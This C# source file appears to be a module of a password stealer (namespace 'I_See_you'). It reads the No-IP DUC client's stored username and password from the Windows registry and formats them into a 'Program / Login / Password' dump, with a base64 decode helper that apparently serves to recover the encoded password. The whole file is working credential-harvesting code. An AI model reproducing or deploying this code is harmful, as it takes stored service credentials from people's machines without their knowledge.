using System;
using System.Collections.Generic;
using System.Text;
using Microsoft.Win32;

namespace I_See_you
{
    class NoIP
    {
        public static List<PassDataNoIp> Initialise()
        {
            List<PassDataNoIp> list = new List<PassDataNoIp>();
            string text = null;
            string text2 = " ";
            string text3 =
                Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Username", null).ToString();
            string text4 =
                Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Vitalwerks\\DUC", "Password", null).ToString();
            list.Add(new PassDataNoIp(text3, text4));
            return list;
        }

        public static string base64Decode(string data)
        {
            string result;
            try
            {
                UTF8Encoding uTF8Encoding = new UTF8Encoding();
                Decoder decoder = uTF8Encoding.GetDecoder();
                byte[] array = Convert.FromBase64String(data);
                int charCount = decoder.GetCharCount(array, 0, array.Length);
                char[] array2 = new char[checked(charCount - 1 + 1)];
                decoder.GetChars(array, 0, array.Length, array2, 0);
                string text = new string(array2);
                result = text;
            }
            catch (Exception ex)
            {
                throw new Exception("Error in base64Decode" + ex.Message);
            }
            return result;
        }
    }

    class PassDataNoIp
    {
        public string Login { get; private set; }
        public string Password { get; private set; }

        public PassDataNoIp(string login, string password)
        {
            Login = login;
            Password = password;
        }

        public override string ToString()
        {
            return
                string.Format(
                    "Program : {0}\r\n\r\nLogin : {1}\r\nPassword : {2}\r\n——————————————————————————————————",
                    new object[]
                    {
                        "NoIp",
                        Login,
                        Password,
                    });
        }
    }
}
